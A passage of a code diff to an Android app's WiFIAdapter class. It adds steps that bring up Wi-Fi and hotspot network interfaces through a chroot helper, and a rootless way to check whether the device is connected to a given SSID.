+                    core.customChrootCommand("ifconfig " + wpsIface + " up", true);
+                }
+                String hsIface = core.getHSInterface();
+                if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
+                    core.customChrootCommand("ifconfig " + hsIface + " up", true);
+                }
+                return;
+            }
             String wpsIface = core.getWPSInterface();
             if (wpsIface != null && wpsIface.length() > 0) {
                 core.customCommand("ifconfig " + wpsIface + " up", true);
@@ -1205,6 +1385,20 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
 
     public boolean checkIsSsidConnected(String ssid){
+        if (core.isRootless()) {
+            try {
+                android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
+                        context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+                if (wm != null) {
+                    android.net.wifi.WifiInfo info = wm.getConnectionInfo();
+                    if (info != null && info.getSSID() != null) {
+                        return info.getSSID().replace("\"", "").equals(ssid);
+                    }
+                }
+            } catch (Exception ignored) {
+            }
+            return false;
+        }
         String line;
         boolean result = false;
         try {
